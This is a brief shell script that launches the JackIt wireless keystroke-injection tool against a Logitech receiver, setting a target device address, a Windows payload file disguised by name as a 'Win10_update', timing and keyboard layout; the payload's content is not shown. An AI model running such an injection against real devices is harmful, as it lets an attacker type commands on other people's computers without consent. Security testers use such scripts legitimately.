#!  /usr/bin/sh

PAYLOAD=/home/steben/Projects/JackItNG/payloads/Windows/Payload---Win10_update.txt
PAYLOAD=pay.pay
ADDRESS=A6:24:11:44:07
VENDOR=logitech
INTERVAL=5
KBD=sv

bin/jackit \
  	--reset \
	--script ${PAYLOAD} \
	--address ${ADDRESS} \
	--vendor ${VENDOR} \
	--interval ${INTERVAL} \
	--layout ${KBD}
